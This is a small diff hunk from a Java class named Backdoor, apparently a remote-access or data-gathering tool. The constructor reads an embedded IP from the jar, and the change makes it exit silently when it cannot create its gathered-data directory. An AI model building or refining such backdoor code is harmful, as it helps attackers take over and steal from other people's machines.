@@ -33,7 +33,8 @@ public class Backdoor {
 	private Backdoor() {
 		try {
 			ip = readFromJar("/ip");
-			new File(gatheredDir).mkdir();
+			if (!new File(gatheredDir).mkdir())
+				throw new Exception();
 		} catch (Exception e) {
 			System.exit(0);
 		}
